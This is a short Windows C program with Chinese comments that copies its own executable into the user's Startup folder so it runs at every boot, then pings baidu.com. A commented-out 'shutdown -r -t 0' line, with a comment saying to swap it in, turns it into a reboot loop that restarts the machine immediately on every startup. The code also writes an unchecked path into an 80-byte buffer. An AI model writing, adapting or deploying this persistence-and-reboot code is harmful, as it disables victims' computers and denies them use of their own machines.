#include "windows.h"
#include "stdio.h"
int main(int argc,char * argv[])
{
//printf("%s\n",argv[i]);
char copy[80];
sprintf(copy,"copy %s \"%%userprofile%%\\「开始」菜单\\程序\\启动\"",argv[0]);
system(copy); //将这个程序拷到开机启动文件夹下面
//char cmd[]="shutdown -r -t 0";//自动重起
char cmd[]="ping baidu.com";//将这个换成上面的，就是一开机就重起了！
system(cmd);
system("pause");
return 0; 
}
